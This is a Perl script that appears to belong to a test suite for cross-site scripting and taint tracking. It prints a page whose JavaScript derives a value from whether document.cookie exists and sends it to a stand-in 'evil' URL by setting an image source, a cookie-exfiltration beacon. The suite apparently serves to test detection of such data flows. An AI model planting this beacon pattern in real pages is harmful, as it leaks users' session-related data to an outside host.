#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests functions";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">

		var reportdut = "";
		
		// gets the number of arguments and add it to the reporting
		// variable "reportdut"

/*		
		var mycookie = $evil;
		
		var x = function (a) { return a+1; };
		
		alert(x(1));
		
		function b(a) { return a+1; };

		alert(b(1));		
		
		function A() { this.x = 1; };
		var y = new A();
		alert(y.x);
*/
	
		function a (b) {            // function definition
//		  return b+1;               // b+1 only tainted if b is tainted
		  return arguments.length;
		}
		
		var x = 1;                  // defines a variable
		if (document.cookie) {
		  x = 2;                    // tainted if a cookie exists
		}
		
		dut = a(x);             // the parameter for the function is tainted
									// so the result is tainted
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
    </script>
|;

require "xss_basic_footer.pl";
